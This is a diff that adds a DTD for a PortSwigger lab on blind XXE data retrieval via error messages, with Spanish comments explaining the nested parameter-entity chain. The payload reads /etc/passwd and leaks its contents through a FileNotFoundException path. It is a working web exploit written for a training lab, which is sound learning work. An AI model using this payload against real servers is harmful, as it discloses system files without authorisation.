@@ -1,0 +1,27 @@
+<!--
+  PortSwigger Lab: Exploiting blind XXE to retrieve data via error messages
+  DTD malicioso para hospedar en el exploit server (URL /exploit).
+
+  Cadena de parameter entities:
+  1. % file lee /etc/passwd (no se resuelve aun, solo se declara)
+  2. % eval contiene una declaracion anidada de %error como string
+     (el &#x25; es la entidad para '%' encodificada para que no se expanda
+     prematuramente al declarar eval, solo cuando eval se expande)
+  3. %eval; expande la declaracion anidada: declara %error con SYSTEM apuntando
+     a un path no existente que CONCATENA el contenido leido por %file
+  4. %error; intenta resolver ese path inventado, falla con FileNotFoundException,
+     y el parser escupe el path completo (con el contenido del archivo) en el
+     mensaje de error que el server lab refleja en la respuesta HTTP.
+
+  Trucos clave:
+  - Doble encoding (&#x25; vs %): controla cuando se expande el % en la
+    declaracion anidada.
+  - Parameter entities (%) en lugar de general entities (&): son las unicas
+    que permiten anidar declaraciones dentro de valores de entidades.
+  - Path inexistente como canal: el FileNotFoundException leak el path completo
+    en el error, y el path contiene el archivo target.
+-->
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
